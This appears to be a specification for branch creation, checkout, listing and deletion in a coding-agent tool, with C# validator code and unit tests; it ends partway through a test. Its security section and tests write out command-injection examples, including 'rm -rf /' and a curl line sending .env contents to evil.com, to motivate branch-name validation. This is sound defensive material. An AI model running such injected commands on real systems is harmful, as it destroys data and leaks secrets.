# Task 022.b: branch create/checkout

**Priority:** P1 – High  
**Tier:** S – Core Infrastructure  
**Complexity:** 5 (Fibonacci points)  
**Phase:** Phase 5 – Git Integration Layer  
**Dependencies:** Task 022 (Git Tool Layer), Task 022.a (Status)  

---

## Description

Task 022.b implements Git branch creation and checkout operations. The agent MUST be able to create feature branches and switch between branches programmatically.

Branch creation MUST support naming conventions. Branch names MUST be validated before creation. Invalid characters MUST be rejected with clear error messages. Duplicate branch names MUST be detected.

Checkout MUST handle working tree state. Uncommitted changes MUST be detected before checkout. Checkout with dirty working tree MUST be blocked by default. Force checkout MUST be available but require explicit opt-in.

Branch listing MUST enumerate all local branches. Remote tracking branches MUST also be listable. Current branch MUST be identified in listings.

Branch deletion MUST be supported with safety checks. Unmerged branches MUST require force delete. Current branch MUST NOT be deletable.

All branch operations MUST work in all operating modes. These are local operations that do NOT require network access.

### Business Value

Branch management enables isolated development workflows. The agent can create feature branches for tasks, switch between work streams, and clean up after completion. This supports the worktree-per-task pattern in Task 023.

### Scope Boundaries

This task covers branch create, checkout, list, and delete. Status and diff are in Task 022.a. Commit and push are in Task 022.c. Remote branch operations beyond listing are out of scope.

### Integration Points

- Task 022: IGitService interface
- Task 022.a: Status check before checkout
- Task 023: Worktree creation uses branches
- Task 018: Command execution

### Failure Modes

- Invalid branch name → Clear validation error
- Branch already exists → BranchExistsException
- Branch not found → BranchNotFoundException
- Dirty working tree → UncommittedChangesException
- Delete current branch → Operation blocked

---

## Assumptions

### Technical Assumptions
1. **Git installed** - Git 2.20+ available in PATH
2. **Repository initialized** - Working directory is valid git repository with at least one commit
3. **Write permissions** - User has write access to .git/ directory for branch creation
4. **Branch naming rules** - Git branch naming rules enforced (no spaces, special chars limited)
5. **Ref namespace** - Branch names stored in refs/heads/ namespace
6. **HEAD management** - Git correctly updates HEAD during checkout
7. **Working tree clean for checkout** - Or conflicts properly detected

### Operational Assumptions
8. **Single active branch** - User working on one branch at a time (no concurrent worktrees)
9. **No force operations by default** - Force checkout/delete requires explicit flag
10. **Remote tracking optional** - Local branches can exist without upstream
11. **Standard branching workflow** - Feature branches created from main/master

---

## Use Cases

### Use Case 1: DevBot Automated Feature Branch Creation

**Persona:** DevBot starts new feature implementation. Creates feature branch, switches to it, implements feature, pushes to remote.

**Before (manual):** Developer runs `git checkout -b feature/auth`, manually types branch name (15 seconds), makes typo 20% of time requiring correction (30 seconds retry).

**After (automated):** DevBot calls `CreateBranchAsync("feature/auth")` then `CheckoutAsync("feature/auth")`, no typos, instant (400ms).

**ROI:** Saves 15-45 seconds per branch creation. 10 branches/week × 50 weeks × 30 seconds average = 250 minutes/year = 4.2 hours × $100/hour = **$420/year per developer**.

### Use Case 2: Jordan Automated Branch Cleanup After Merge

**Persona:** Jordan merges feature branch to main. Needs to delete local and remote feature branches to keep repository clean.

**Before (manual):** Jordan runs `git branch -d feature/done`, then `git push origin --delete feature/done`, manually types branch name twice, takes 1 minute.

**After (automated):** Agent calls `DeleteBranchAsync("feature/done", force: false)`, automatically cleans up local branch, 200ms.

**ROI:** Saves 1 minute per merged branch. 100 merges/year × 1 min = 100 minutes = 1.67 hours × $120/hour = **$200/year per eng**.

### Use Case 3: Alex List All Branches for Release Planning

**Persona:** Alex needs to see all active feature branches to plan sprint release scope.

**Before (manual):** Alex runs `git branch -a`, manually copies output to spreadsheet, categorizes by feature type (10 minutes).

**After (automated):** Agent calls `GetBranchesAsync()`, receives structured `GitBranch[]`, automatically categorizes by name prefix (feature/, fix/, hotfix/), generates report (30 seconds).

**ROI:** Saves 9.5 minutes per planning session. 26 sprints/year × 9.5 min = 247 minutes = 4.1 hours × $120/hour = **$492/year per PM**.

**Combined ROI:** $420 + $200 + $492 = **$1,112/year per team**.

---

## Glossary / Terms

| Term | Definition |
|------|------------|
| Branch | Named pointer to a commit |
| HEAD | Reference to current branch or commit |
| Checkout | Switch working tree to different branch |
| Detached HEAD | HEAD points to commit, not branch |
| Remote Branch | Branch on remote repository |
| Tracking Branch | Local branch tracking remote |
| Upstream | Remote branch a local branch tracks |
| Fast-forward | Branch update without merge commit |

---

## Out of Scope

- Remote branch creation
- Branch renaming
- Branch protection rules
- Pull request integration
- Merge operations
- Rebase operations
- Cherry-pick operations

---

## Functional Requirements

### FR-001 to FR-020: Branch Creation

- FR-001: `CreateBranchAsync` MUST create new branch
- FR-002: Branch MUST be created at current HEAD by default
- FR-003: Custom start point MUST be supported
- FR-004: Branch name MUST be validated
- FR-005: Invalid characters MUST be rejected
- FR-006: Branch name MUST NOT start with `-`
- FR-007: Branch name MUST NOT contain `..`
- FR-008: Branch name MUST NOT contain whitespace
- FR-009: Branch name MUST NOT end with `.lock`
- FR-010: Duplicate name MUST throw BranchExistsException
- FR-011: `--force` MUST reset existing branch
- FR-012: Created branch MUST be returned
- FR-013: Creation MUST NOT switch to new branch
- FR-014: `--checkout` MUST switch to new branch
- FR-015: Branch MUST be created atomically
- FR-016: Branch ref MUST be visible after creation
- FR-017: Creation MUST be logged
- FR-018: Error MUST include suggested fix
- FR-019: Empty branch name MUST be rejected
- FR-020: Branch name length MUST be validated (<255 chars)

### FR-021 to FR-040: Checkout Operation

- FR-021: `CheckoutAsync` MUST switch to branch
- FR-022: Working tree MUST be updated
- FR-023: Index MUST be updated
- FR-024: HEAD MUST point to branch
- FR-025: Uncommitted changes MUST block checkout
- FR-026: `--force` MUST discard local changes
- FR-027: Untracked files MUST NOT block checkout
- FR-028: Conflicting untracked files MUST block
- FR-029: Non-existent branch MUST throw exception
- FR-030: Detached HEAD checkout MUST be supported
- FR-031: Checkout of commit SHA MUST work
- FR-032: Checkout of tag MUST work
- FR-033: Current branch MUST be updated after checkout
- FR-034: Checkout MUST be logged
- FR-035: Checkout progress MUST be reportable
- FR-036: `--quiet` MUST suppress output
- FR-037: Pathspec checkout MUST be supported
- FR-038: Partial checkout MUST NOT change HEAD
- FR-039: Remote branch checkout MUST create tracking
- FR-040: Checkout MUST handle submodules

### FR-041 to FR-060: Branch Listing

- FR-041: `ListBranchesAsync` MUST return all local branches
- FR-042: Each branch MUST include name
- FR-043: Each branch MUST include SHA
- FR-044: Current branch MUST be marked
- FR-045: `--remote` MUST list remote branches
- FR-046: `--all` MUST list local and remote
- FR-047: Upstream tracking MUST be included
- FR-048: Ahead/behind counts MUST be available
- FR-049: Last commit date MUST be available
- FR-050: Sorting MUST be configurable
- FR-051: Default sort MUST be by name
- FR-052: `--sort=-committerdate` MUST work
- FR-053: Pattern matching MUST filter results
- FR-054: Merged branches MUST be identifiable
- FR-055: Unmerged branches MUST be identifiable
- FR-056: Listing MUST complete in <1s for 1000 branches
- FR-057: Empty result MUST return empty list
- FR-058: Listing MUST work in detached HEAD
- FR-059: Symbolic refs MUST be handled
- FR-060: Listing MUST be cacheable

### FR-061 to FR-070: Branch Deletion

- FR-061: `DeleteBranchAsync` MUST delete local branch
- FR-062: Current branch MUST NOT be deletable
- FR-063: Merged branches MUST delete without force
- FR-064: Unmerged branches MUST require force
- FR-065: `--force` MUST delete unmerged branch
- FR-066: Deletion MUST be logged
- FR-067: Non-existent branch MUST return success
- FR-068: Multiple branches MUST be deletable
- FR-069: Remote tracking refs MUST be deletable
- FR-070: Deletion MUST be atomic

---

## Non-Functional Requirements

### NFR-001 to NFR-015: Performance and Reliability

- NFR-001: Branch creation MUST complete in <200ms
- NFR-002: Checkout MUST complete in <1s for clean repos
- NFR-003: Checkout MUST complete in <5s for large repos
- NFR-004: Listing MUST complete in <1s for 1000 branches
- NFR-005: Memory MUST NOT exceed 20MB for operations
- NFR-006: Concurrent branch operations MUST be safe
- NFR-007: Failed operations MUST NOT leave partial state
- NFR-008: Interrupted checkout MUST be recoverable
- NFR-009: File locks MUST timeout after 30s
- NFR-010: Operations MUST support cancellation
- NFR-011: Path sanitization MUST prevent injection
- NFR-012: Branch name MUST be escaped in commands
- NFR-013: Error messages MUST NOT leak paths
- NFR-014: Temporary refs MUST be cleaned up
- NFR-015: Atomic ref updates MUST be used

---

## User Manual Documentation

### Quick Start

```bash
# Create a new branch
acode git branch create feature/my-feature

# Switch to a branch
acode git checkout feature/my-feature

# List all branches
acode git branch list

# Delete a branch
acode git branch delete feature/my-feature
```

### Branch Create Command

```bash
acode git branch create <name> [options]

Options:
  --start-point REF     Start branch from this ref (default: HEAD)
  --checkout            Switch to new branch after creation
  --force               Reset branch if it exists
```

### Checkout Command

```bash
acode git checkout <branch> [options]

Options:
  --force               Discard local changes
  --quiet               Suppress output
```

### Branch List Command

```bash
acode git branch list [options]

Options:
  --remote              List remote branches
  --all                 List local and remote
  --sort FIELD          Sort by: name, committerdate
  --format FORMAT       Output: text, json
```

### Troubleshooting

**Q: "Branch already exists"**

Use `--force` to reset the branch, or choose a different name.

**Q: "Uncommitted changes would be lost"**

Commit or stash changes before checkout:
```bash
acode git stash  # or commit changes
acode git checkout feature/branch
```

---

## Acceptance Criteria / Definition of Done

- [ ] AC-001: Branch creation works
- [ ] AC-002: Branch name validation works
- [ ] AC-003: Duplicate detection works
- [ ] AC-004: Checkout switches branches
- [ ] AC-005: Dirty tree blocks checkout
- [ ] AC-006: Force checkout works
- [ ] AC-007: Branch listing returns all branches
- [ ] AC-008: Current branch marked in list
- [ ] AC-009: Branch deletion works
- [ ] AC-010: Unmerged branch requires force
- [ ] AC-011: CLI commands work
- [ ] AC-012: Error messages are clear
- [ ] AC-013: Performance benchmarks met
- [ ] AC-014: Unit tests >90% coverage

---

## Best Practices

### Branch Naming

1. **Validate names early** - Check against git naming rules before creation
2. **Use consistent prefixes** - feature/, bugfix/, task/ for organization
3. **Include task ID** - Link branches to tasks: task-123-description
4. **Avoid special characters** - Alphanumeric, hyphen, slash only

### Checkout Operations

5. **Check for uncommitted changes** - Warn or fail if working tree dirty
6. **Handle detached HEAD** - Detect and warn about headless state
7. **Update submodules** - Optionally update submodules on checkout
8. **Preserve stash if needed** - Offer to stash changes before switching

### Safety

9. **Confirm force operations** - Force delete requires explicit confirmation
10. **List affected files** - Show what would change before checkout
11. **Backup current work** - Stash or commit before risky operations
12. **Track branch operations** - Log creates, deletes, renames

---

## Security Considerations

### Threat 1: Command Injection via Malicious Branch Names

**Risk:** HIGH - Arbitrary command execution through unsanitized branch names passed to shell commands.

**Attack Scenario:**
```bash
# Attacker provides malicious branch name
acode git branch create "feature; rm -rf /"
# Or via API
git.CreateBranchAsync("/repo", "main && curl evil.com/exfil?data=$(cat .env)")
```

Without validation, this could:
- Execute arbitrary commands on the host system
- Exfiltrate sensitive data from environment variables or config files
- Delete repository contents or system files
- Establish persistence mechanisms (backdoors, cron jobs)

**Mitigation:**

```csharp
// BranchNameValidator.cs - Enhanced with command injection prevention
namespace Acode.Infrastructure.Git;

public sealed class BranchNameValidator : IBranchNameValidator
{
    private static readonly char[] ShellMetacharacters =
    {
        ';', '&', '|', '$', '`', '<', '>', '(', ')', '{', '}',
        '\'', '"', '\\', '\n', '\r', '\t'
    };

    private static readonly char[] GitInvalidChars =
    {
        ' ', '~', '^', ':', '?', '*', '[', '@'
    };

    private static readonly string[] ProhibitedPatterns =
    {
        "..", ".lock", "//", "/@", "@{", "/.", "./"
    };

    public ValidationResult Validate(string branchName)
    {
        var errors = new List<string>();

        // Check for null/empty
        if (string.IsNullOrWhiteSpace(branchName))
        {
            errors.Add("Branch name cannot be empty");
            return new ValidationResult(false, errors);
        }

        // Check length (Git ref name limit)
        if (branchName.Length > 255)
        {
            errors.Add($"Branch name exceeds 255 characters (got {branchName.Length})");
        }

        // Check for shell metacharacters (command injection risk)
        foreach (var meta in ShellMetacharacters)
        {
            if (branchName.Contains(meta))
            {
                errors.Add($"Branch name contains dangerous character: '{EscapeForDisplay(meta)}' (possible injection attempt)");
                return new ValidationResult(false, errors); // Fail fast on injection risk
            }
        }

        // Check for Git invalid characters
        foreach (var invalid in GitInvalidChars)
        {
            if (branchName.Contains(invalid))
            {
                errors.Add($"Branch name contains invalid Git character: '{EscapeForDisplay(invalid)}'");
            }
        }

        // Check for prohibited patterns
        foreach (var pattern in ProhibitedPatterns)
        {
            if (branchName.Contains(pattern))
            {
                errors.Add($"Branch name contains prohibited pattern: '{pattern}'");
            }
        }

        // Check start/end constraints
        if (branchName.StartsWith('-'))
        {
            errors.Add("Branch name cannot start with '-' (would be interpreted as git option)");
        }

        if (branchName.StartsWith('.'))
        {
            errors.Add("Branch name cannot start with '.'");
        }

        if (branchName.EndsWith('.'))
        {
            errors.Add("Branch name cannot end with '.'");
        }

        if (branchName.EndsWith('/'))
        {
            errors.Add("Branch name cannot end with '/'");
        }

        // Check for control characters
        if (branchName.Any(c => char.IsControl(c)))
        {
            errors.Add("Branch name contains control characters");
        }

        // Check for null bytes (injection technique)
        if (branchName.Contains('\0'))
        {
            errors.Add("Branch name contains null byte (possible injection attempt)");
        }

        return new ValidationResult(errors.Count == 0, errors);
    }

    private static string EscapeForDisplay(char c)
    {
        return c switch
        {
            '\n' => "\\n",
            '\r' => "\\r",
            '\t' => "\\t",
            '\0' => "\\0",
            _ => c.ToString()
        };
    }
}

public sealed record ValidationResult(bool IsValid, IReadOnlyList<string> Errors);

// Usage in GitService
public async Task<GitBranch> CreateBranchAsync(
    string workingDir,
    string name,
    CreateBranchOptions? options = null,
    CancellationToken ct = default)
{
    // Validate BEFORE any git operations
    var validation = _branchValidator.Validate(name);
    if (!validation.IsValid)
    {
        _logger.LogWarning("Branch name validation failed: {Name}, Errors: {Errors}",
            name, string.Join(", ", validation.Errors));
        throw new InvalidBranchNameException(name, validation.Errors);
    }

    // Additional: Use parameterized execution (not string concatenation)
    // CommandRunner should handle proper escaping
    await _commandRunner.RunAsync("git", new[] { "branch", name }, workingDir, ct);
}
```

### Threat 2: Data Loss via Force Checkout Without User Confirmation

**Risk:** MEDIUM - Force checkout discards uncommitted changes without confirmation, leading to irreversible data loss.

**Attack Scenario:**
```bash
# User has uncommitted work
echo "important changes" > feature.cs

# Attacker or buggy script triggers force checkout
acode git checkout main --force

# User's uncommitted changes are permanently lost
```

This can happen when:
- Automated scripts use --force by default
- User accidentally types --force flag
- Agent performs force checkout without understanding consequences
- Race condition: user makes changes between status check and checkout

**Mitigation:**

```csharp
// CheckoutSafetyGuard.cs - Enforce explicit confirmation for destructive operations
namespace Acode.Application.Git;

public sealed class CheckoutSafetyGuard : ICheckoutSafetyGuard
{
    private readonly IGitService _git;
    private readonly ILogger<CheckoutSafetyGuard> _logger;

    public async Task<CheckoutSafetyReport> AnalyzeCheckoutSafety(
        string workingDir,
        string targetBranch,
        bool isForce,
        CancellationToken ct)
    {
        var status = await _git.GetStatusAsync(workingDir, ct);

        var report = new CheckoutSafetyReport
        {
            IsSafe = status.IsClean,
            TargetBranch = targetBranch,
            IsForce = isForce
        };

        if (!status.IsClean)
        {
            report.UncommittedFileCount = status.StagedFiles.Count + status.UnstagedFiles.Count;
            report.UntrackedFileCount = status.UntrackedFiles.Count;
            report.AffectedFiles = status.StagedFiles
                .Concat(status.UnstagedFiles)
                .Select(f => f.Path)
                .ToList();

            if (isForce)
            {
                report.DataLossRisk = DataLossRisk.High;
                report.Warning = $"FORCE CHECKOUT will permanently discard {report.UncommittedFileCount} uncommitted files. This cannot be undone.";
            }
            else
            {
                report.DataLossRisk = DataLossRisk.None;
                report.Warning = $"Checkout blocked: {report.UncommittedFileCount} uncommitted files. Commit or stash first.";
            }
        }

        return report;
    }
}

public sealed record CheckoutSafetyReport
{
    public required bool IsSafe { get; init; }
    public required string TargetBranch { get; init; }
    public required bool IsForce { get; init; }
    public int UncommittedFileCount { get; init; }
    public int UntrackedFileCount { get; init; }
    public IReadOnlyList<string> AffectedFiles { get; init; } = Array.Empty<string>();
    public DataLossRisk DataLossRisk { get; init; } = DataLossRisk.None;
    public string? Warning { get; init; }
}

public enum DataLossRisk { None, Low, Medium, High }

// Enhanced CheckoutAsync with safety guard
public async Task CheckoutAsync(
    string workingDir,
    string branchOrCommit,
    CheckoutOptions? options = null,
    CancellationToken ct = default)
{
    options ??= new CheckoutOptions();

    await EnsureRepositoryAsync(workingDir, ct);

    // Always analyze safety before checkout
    var safetyReport = await _safetyGuard.AnalyzeCheckoutSafety(
        workingDir,
        branchOrCommit,
        options.Force,
        ct);

    if (!safetyReport.IsSafe)
    {
        if (options.Force)
        {
            // Force checkout: Log data loss warning and affected files
            _logger.LogWarning(
                "FORCE CHECKOUT will discard {Count} uncommitted files: {Files}",
                safetyReport.UncommittedFileCount,
                string.Join(", ", safetyReport.AffectedFiles.Take(10)));

            // If interactive mode, require explicit confirmation
            if (_config.InteractiveMode && !options.ConfirmDataLoss)
            {
                throw new ConfirmationRequiredException(
                    $"Force checkout requires explicit confirmation. {safetyReport.UncommittedFileCount} files will be lost.",
                    safetyReport);
            }
        }
        else
        {
            // Non-force checkout: Block operation
            throw new UncommittedChangesException(
                workingDir,
                safetyReport.UncommittedFileCount,
                safetyReport.AffectedFiles);
        }
    }

    // Proceed with checkout
    var args = new List<string> { "checkout" };

    if (options.Force)
    {
        args.Add("--force");
    }

    if (options.Quiet)
    {
        args.Add("--quiet");
    }

    args.Add(branchOrCommit);

    try
    {
        await ExecuteGitAsync(workingDir, args, ct);
        _logger.LogInformation("Checked out {Branch} in {Dir}", branchOrCommit, workingDir);
    }
    catch (GitException ex) when (ex.StdErr?.Contains("did not match") == true)
    {
        throw new BranchNotFoundException(branchOrCommit, workingDir, ex.StdErr);
    }
}

// CLI command with confirmation prompt
public class GitCheckoutCommand
{
    public async Task<int> ExecuteAsync(
        IGitService git,
        IConsole console,
        CancellationToken ct)
    {
        if (Force)
        {
            // Show warning and require confirmation
            console.WriteLine("⚠️  WARNING: Force checkout will discard uncommitted changes.");
            console.Write("Type 'yes' to confirm: ");
            var response = console.ReadLine();

            if (response?.ToLowerInvariant() != "yes")
            {
                console.WriteLine("❌ Checkout cancelled.");
                return 1;
            }
        }

        await git.CheckoutAsync(cwd, Target, new CheckoutOptions
        {
            Force = Force,
            ConfirmDataLoss = true // User confirmed
        }, ct);

        console.WriteLine($"✓ Switched to '{Target}'");
        return 0;
    }
}
```

### Threat 3: Branch Enumeration Information Disclosure

**Risk:** LOW - Branch listing exposes information about development activity, feature roadmap, security fixes.

**Attack Scenario:**
```bash
# Attacker with read access lists branches
acode git branch list --all

# Output reveals:
# - feature/secret-customer-name
# - hotfix/CVE-2024-12345-auth-bypass
# - release/v2.0-major-rewrite
# - experimental/blockchain-integration
```

Branch names can leak:
- Customer names and contracts (NDA violations)
- Unannounced features and roadmap
- Security vulnerabilities before patches released
- Internal project codenames
- Developer identities and workflow patterns

**Mitigation:**

```csharp
// BranchNameSanitizer.cs - Redact sensitive information from branch names
namespace Acode.Infrastructure.Git;

public sealed class BranchNameSanitizer : IBranchNameSanitizer
{
    private static readonly Regex CvePattern = new(
        @"CVE-\d{4}-\d{4,7}",
        RegexOptions.Compiled | RegexOptions.IgnoreCase);

    private static readonly Regex CustomerPattern = new(
        @"(customer|client|partner)-[\w-]+",
        RegexOptions.Compiled | RegexOptions.IgnoreCase);

    private readonly IConfiguration _config;
    private readonly ILogger<BranchNameSanitizer> _logger;

    public IReadOnlyList<GitBranch> SanitizeForDisplay(
        IReadOnlyList<GitBranch> branches,
        SanitizationLevel level)
    {
        if (level == SanitizationLevel.None)
        {
            return branches;
        }

        return branches.Select(b => SanitizeBranch(b, level)).ToList();
    }

    private GitBranch SanitizeBranch(GitBranch branch, SanitizationLevel level)
    {
        var sanitizedName = branch.Name;

        if (level >= SanitizationLevel.RedactCVEs)
        {
            // Redact CVE identifiers to prevent disclosure of unpatched vulnerabilities
            sanitizedName = CvePattern.Replace(sanitizedName, "CVE-XXXX-XXXXX");
        }

        if (level >= SanitizationLevel.RedactCustomers)
        {
            // Redact customer/partner names to prevent NDA violations
            sanitizedName = CustomerPattern.Replace(sanitizedName, m =>
            {
                var prefix = m.Groups[1].Value;
                return $"{prefix}-[REDACTED]";
            });
        }

        if (level >= SanitizationLevel.RedactAll)
        {
            // Hash branch names for anonymized display
            var hash = Convert.ToHexString(
                SHA256.HashData(Encoding.UTF8.GetBytes(branch.Name)))[..8];
            sanitizedName = $"branch-{hash}";
        }

        return branch with
        {
            Name = sanitizedName,
            FullName = branch.FullName.Replace(branch.Name, sanitizedName),
            LastCommitSubject = level >= SanitizationLevel.RedactAll
                ? "[REDACTED]"
                : branch.LastCommitSubject
        };
    }
}

public enum SanitizationLevel
{
    None = 0,
    RedactCVEs = 1,
    RedactCustomers = 2,
    RedactAll = 3
}

// Apply sanitization in GitService
public async Task<IReadOnlyList<GitBranch>> ListBranchesAsync(
    string workingDir,
    ListBranchesOptions? options = null,
    CancellationToken ct = default)
{
    options ??= new ListBranchesOptions();

    // ... execute git branch command ...

    var branches = _branchParser.ParseList(result.StdOut);

    // Apply sanitization based on configuration and mode
    var sanitizationLevel = DetermineSanitizationLevel();
    if (sanitizationLevel != SanitizationLevel.None)
    {
        branches = _sanitizer.SanitizeForDisplay(branches, sanitizationLevel);
        _logger.LogInformation("Applied branch name sanitization level: {Level}", sanitizationLevel);
    }

    return branches;
}

private SanitizationLevel DetermineSanitizationLevel()
{
    // Never sanitize in LocalOnly mode (user has full access to repo)
    if (_modeResolver.CurrentMode == OperatingMode.LocalOnly)
    {
        return SanitizationLevel.None;
    }

    // In Burst mode with cloud logging, apply sanitization
    if (_modeResolver.CurrentMode == OperatingMode.Burst && _config.EnableCloudLogging)
    {
        return SanitizationLevel.RedactCustomers;
    }

    // User-configured level
    return _config.BranchSanitizationLevel;
}
```

---

## Troubleshooting

### Issue 1: Branch Creation Fails with "Cannot Lock Ref"

**Symptoms:**
- `CreateBranchAsync` throws GitException: "error: cannot lock ref 'refs/heads/feature'"
- Error message: "Unable to create '/repo/.git/refs/heads/feature.lock': File exists"
- Branch creation succeeds on retry after delay
- Happens intermittently, more frequent under high load
- Other git operations (status, log) work fine

**Root Causes:**
1. **Stale lock file** - Previous git operation crashed leaving .lock file
2. **Concurrent operations** - Multiple processes trying to create same branch
3. **File system lag** - Network file system (NFS) has delayed lock release
4. **Antivirus interference** - AV scanning .git/ directory holding locks
5. **Insufficient permissions** - User can't delete stale lock files

**Solutions:**

```bash
# Solution 1: Check for and remove stale lock files (safe if no git operations running)
find .git/refs/heads -name "*.lock" -mmin +5 -delete
# Shows: Removed stale lock files older than 5 minutes

# Solution 2: Wait for lock release with timeout
timeout=30
while [ -f .git/refs/heads/feature.lock ] && [ $timeout -gt 0 ]; do
  echo "Waiting for lock release... ($timeout seconds remaining)"
  sleep 1
  ((timeout--))
done

if [ -f .git/refs/heads/feature.lock ]; then
  echo "ERROR: Lock file still exists after 30 seconds"
  echo "Manually remove: rm .git/refs/heads/feature.lock"
else
  git branch feature
  echo "✓ Branch created successfully"
fi

# Solution 3: Check for concurrent git processes
ps aux | grep git
# Shows: git processes that may be holding locks
# Kill hanging processes: kill -9 <PID>

# Solution 4: Verify file system permissions
ls -la .git/refs/heads/
# Expected: User has write permissions (rwx)
# Fix: chmod u+w .git/refs/heads/

# Solution 5: Use atomic ref operations (implemented in GitService)
git update-ref refs/heads/feature $(git rev-parse HEAD)
# Lower-level command that handles locking more reliably
```

### Issue 2: Checkout Fails with "Your Local Changes Would Be Overwritten"

**Symptoms:**
- `CheckoutAsync` throws UncommittedChangesException
- Error: "error: Your local changes to 'file.cs' would be overwritten by checkout"
- Happens even when user believes working tree is clean
- `git status` shows modified files
- Files appear identical to HEAD version

**Root Causes:**
1. **Line ending differences** - File has CRLF locally but LF in Git (core.autocrlf issues)
2. **Whitespace changes** - Trailing spaces, tabs vs spaces
3. **File mode changes** - Executable bit changed (chmod +x)
4. **Staged changes** - Files in index differ from HEAD
5. **Partially committed hunks** - File has both staged and unstaged changes
6. **Submodule changes** - Submodule pointer changed but not committed

**Solutions:**

```bash
# Solution 1: Check what actually changed
git diff feature.cs
# Shows: Actual differences causing the block
# If empty: likely line endings or mode changes

# Solution 2: Check line ending differences
git diff --check
# Shows: Whitespace errors including line ending issues

# Solution 3: Reset file to match HEAD (discard local changes)
git checkout HEAD -- feature.cs
echo "✓ Reset feature.cs to HEAD version"

# Solution 4: Stash changes and reapply after checkout
git stash push -m "Auto-stash before checkout"
# Shows: Saved working directory and index state
git checkout other-branch
# Shows: Switched to 'other-branch'
git stash pop
# Shows: Changes reapplied (may have conflicts)

# Solution 5: Check for submodule changes
git status
# Shows: "modified: path/to/submodule (new commits)"
git submodule status
# Shows: +abc123 path/to/submodule (points to different commit)

cd path/to/submodule
git status
# Shows: Submodule's working directory state

# Commit submodule change or reset it
git submodule update --init
# Shows: Submodule reset to commit in parent repo

# Solution 6: Force checkout (DESTRUCTIVE - discards changes)
git checkout --force other-branch
# Shows: Switched to 'other-branch'. Uncommitted changes LOST.
```

### Issue 3: Branch List Shows No Branches After Fresh Clone

**Symptoms:**
- `ListBranchesAsync` returns empty list
- Fresh clone of remote repository
- `git branch` shows no branches
- `git branch -a` shows only remote branches (origin/main, origin/feature)
- HEAD is detached or points to nonexistent local branch
- `git status` shows "HEAD detached at abc123"

**Root Causes:**
1. **No local branches created** - Clone created only remote tracking branches
2. **Default branch not checked out** - `--no-checkout` flag used during clone
3. **Empty repository** - Remote has no commits yet
4. **Detached HEAD** - Checked out specific commit instead of branch
5. **Shallow clone** - `--depth=1` clone with no branch refs

**Solutions:**

```bash
# Solution 1: Check if any local branches exist
git branch --list
# Shows: (empty if no local branches)

git branch -a
# Shows:
#   remotes/origin/main
#   remotes/origin/feature/foo

# Solution 2: Create local branch tracking remote
git checkout -b main origin/main
# Shows:
#   Branch 'main' set up to track remote branch 'main' from 'origin'.
#   Switched to a new branch 'main'

git branch
# Shows:
#   * main

# Solution 3: Check current HEAD state
git status
# Shows: Either:
#   "On branch main" (good)
#   "HEAD detached at abc123" (need to create branch)

cat .git/HEAD
# Shows: Either:
#   "ref: refs/heads/main" (good - pointing to branch)
#   "abc123..." (bad - detached HEAD with commit SHA)

# Solution 4: If detached HEAD, create branch from current position
git checkout -b recovered-work
# Shows: Switched to a new branch 'recovered-work'

# Solution 5: For empty repository, create initial commit first
echo "# Project" > README.md
git add README.md
git commit -m "Initial commit"
git branch
# Shows:
#   * main

# Solution 6: Re-clone properly with branch checkout
git clone --branch main https://github.com/user/repo.git
cd repo
git branch
# Shows:
#   * main
```

---

## Testing Requirements

```csharp
// File: tests/Acode.Infrastructure.Tests/Git/BranchNameValidatorTests.cs
namespace Acode.Infrastructure.Tests.Git;

public class BranchNameValidatorTests
{
    private readonly BranchNameValidator _validator = new();

    [Fact]
    public void Validate_WithValidBranchName_ReturnsValid()
    {
        // Arrange
        var branchName = "feature/my-feature-123";

        // Act
        var result = _validator.Validate(branchName);

        // Assert
        result.IsValid.Should().BeTrue();
        result.Errors.Should().BeEmpty();
    }

    [Theory]
    [InlineData("feature; rm -rf /", "dangerous character")]
    [InlineData("main && curl evil.com", "dangerous character")]
    [InlineData("feat|pwd", "dangerous character")]
    [InlineData("test$var", "dangerous character")]
    [InlineData("back`tick`", "dangerous character")]
    public void Validate_WithShellMetacharacters_ReturnsInvalid(string branchName, string expectedError)
    {
        // Act
        var result = _validator.Validate(branchName);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Errors.Should().ContainMatch($"*{expectedError}*");
    }

    [Theory]
    [InlineData("-feature", "cannot start with '-'")]
    [InlineData(".feature", "cannot start with '.'")]
    [InlineData("feature.", "cannot end with '.'")]
    [InlineData("feature.lock", "cannot end with '.lock'")]
    [InlineData("feature..test", "cannot contain '..'")]
    [InlineData("feature/@test", "cannot contain '/@'")]
    public void Validate_WithProhibitedPatterns_ReturnsInvalid(string branchName, string expectedError)
    {
        // Act
        var result = _validator.Validate(branchName);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Errors.Should().ContainMatch($"*{expectedError}*");
    }

    [Fact]
    public void Validate_WithEmptyName_ReturnsInvalid()
    {
        // Act
        var result = _validator.Validate("");

        // Assert
        result.IsValid.Should().BeFalse();
        result.Errors.Should().Contain("Branch name cannot be empty");
    }

    [Fact]
    public void Validate_WithExcessiveLength_ReturnsInvalid()
    {
        // Arrange
        var branchName = new string('a', 300);

        // Act
        var result = _validator.Validate(branchName);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Errors.Should().ContainMatch("*exceeds 255 characters*");
    }

    [Theory]
    [InlineData("feature\ntest", "control characters")]
    [InlineData("feature\0test", "null byte")]
    [InlineData("feature\ttest", "dangerous character")]
    public void Validate_WithControlCharacters_ReturnsInvalid(string branchName, string expectedError)
    {
        // Act
        var result = _validator.Validate(branchName);

        // Assert
        result.IsValid.Should().BeFalse();
        result.Errors.Should().ContainMatch($"*{expectedError}*");
    }
}

// File: tests/Acode.Infrastructure.Tests/Git/BranchParserTests.cs
namespace Acode.Infrastructure.Tests.Git;

public class BranchParserTests
{
    private readonly BranchParser _parser = new();

    [Fact]
    public void ParseList_WithCurrentBranch_MarksIsCurrent()
    {
        // Arrange
        var output = @"*|main|abc123||[ahead 2]|2024-01-15T10:30:00-05:00|Initial commit
 |feature|def456|origin/feature|[behind 1]|2024-01-14T09:20:00-05:00|Add feature";

        // Act
        var branches = _parser.ParseList(output);

        // Assert
        branches.Should().HaveCount(2);
        branches[0].Name.Should().Be("main");
        branches[0].IsCurrent.Should().BeTrue();
        branches[0].Sha.Should().Be("abc123");
        branches[0].AheadBy.Should().Be(2);
        branches[1].Name.Should().Be("feature");
        branches[1].IsCurrent.Should().BeFalse();
        branches[1].BehindBy.Should().Be(1);
        branches[1].Upstream.Should().Be("origin/feature");
    }

    [Fact]
    public void ParseList_WithRemoteBranches_MarksIsRemote()
    {
        // Arrange
        var output = @" |origin/main|abc123|||2024-01-15T10:30:00-05:00|Remote commit";

        // Act
